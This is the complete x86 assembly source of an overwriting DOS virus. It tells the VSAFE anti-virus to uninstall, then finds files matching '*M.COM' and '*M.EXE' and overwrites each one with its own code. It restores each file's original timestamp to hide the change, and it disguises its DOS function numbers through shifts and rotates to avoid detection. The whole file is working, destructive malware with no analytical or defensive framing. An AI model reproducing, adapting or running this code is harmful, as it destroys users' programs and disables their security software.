.model tiny           
.radix 16       ; lets use hex
.code        

           Org     100h                   ; This makes it *.COM
 
start:     mov     ax,64001d              ; wakes up VSAFE to keyboard input
           mov     dx,5945h               ; asks VSAFE to de-install
           int     16h                    ; calls VSAFE-hooked interrupt: keyboard
           
           lea     Dx, [filemask]         ; Point Dx To FileMask
           Mov     Ah, 4Eh                ; Find First Match
Getbad:    Int     21h                    ; Let Dos Do It
           Jb      Outahere               ; If No Matches Get Out
           mov     Dl, 9Eh                ; Found One, Point To The FileName
           mov     dh, 00h
           mov     cl, 7ah                ; This loads 7a04 into ax
           xchg    ah, cl                 ; shr makes 7a04 into 3d02
           mov     al, 04h                ; '   '
           shr     ax,1                   ; Open The File Up
           Int     21h                    ; Let Dos Do It
           xchg    Bx, Ax                 ; Put File Handle In Bx
           mov     al,0                   ; Get and push the date 
           mov     ah,0aeh                 ; '  '
           ror     ah,1
           int     21h                    ; '  '
           push    cx                     ; '  '
           push    dx                     ; '  '
           xor     dl,dl                  ; gotta keep those register straight
           mov     dx, 0200h              ; Start Writing At 0100h
           dec     dh                     ; trying to be a little trickey
           Mov     Cx, 0FFFh              ; Write the virus
           Mov     Ah, 40h                ; Write File
           Int     21h                    ; Let Dos Do It
           mov     al,1                   ; pop and set the date time
           mov     ah,0aeh                 ; '  '
           ror     ah,1
           pop     dx                     ; '  '
           pop     cx                     ; '  '
           int     21h                    ; '  '
           Mov     Ah, 3Eh                ; Close File
           Int     21h                    ; Let Dos do it

           Xor     cx,cx                  ; Clear these two before going 
           xor     ax,ax                  ; any further
NxtMatch:  Mov     Ah, 4Fh                ; Find Next Match
           call    Getbad                 ; Call To Start the overwrite

outahere:  lea     Dx, [filemask1]         ; Point Dx To FileMask
           Mov     Ah, 4Eh                ; Find First Match
 
Getbad1:   Int     21h                    ; Let Dos Do It
           Jb      Outahere1               ; If No Matches Get Out
           mov     Dl, 9Eh                ; Found One, Point To The FileName
           mov     dh, 00h
           mov     cl, 7ah                ; This loads 7a04 into ax
           xchg    ah, cl                 ; shr makes 7a04 into 3d02
           mov     al, 04h                ; '   '
           shr     ax,1                   ; Open The File Up
           Int     21h                    ; Let Dos Do It
           xchg    Bx, Ax                 ; Put File Handle In Bx
           mov     al,0                   ; Get and push the date 
           mov     ah,0aeh                 ; '  '
           ror     ah,1
           int     21h                    ; '  '
           push    cx                     ; '  '
           push    dx                     ; '  '
           xor     dl,dl                  ; gotta keep those register straight
           mov     dx, 0200h              ; Start Writing At 0100h
           dec     dh                     ; trying to be a little trickey
           Mov     Cx, 0FFFh              ; Write the virus
           Mov     Ah, 40h                ; Write File
           Int     21h                    ; Let Dos Do It
           mov     al,1                   ; pop and set the date time
           mov     ah,0aeh                 ; '  '
           ror     ah,1
           pop     dx                     ; '  '
           pop     cx                     ; '  '
           int     21h                    ; '  '
           Mov     Ah, 3Eh                ; Close File
           Int     21h                    ; Let Dos do it

           Xor     cx,cx                  ; Clear these two before going 
           xor     ax,ax                  ; any further
           
NxtMatch1:  Mov     Ah, 4Fh                ; Find Next Match
           call    Getbad1                 ; Call To Start the overwrite

outahere1: ret 
twister    db      ?
mr         db      ?
FileMask:  Db      '*M.COM',0                    ; What are we after
filemask1: db      '*M.EXE',0
end start
    End   code
    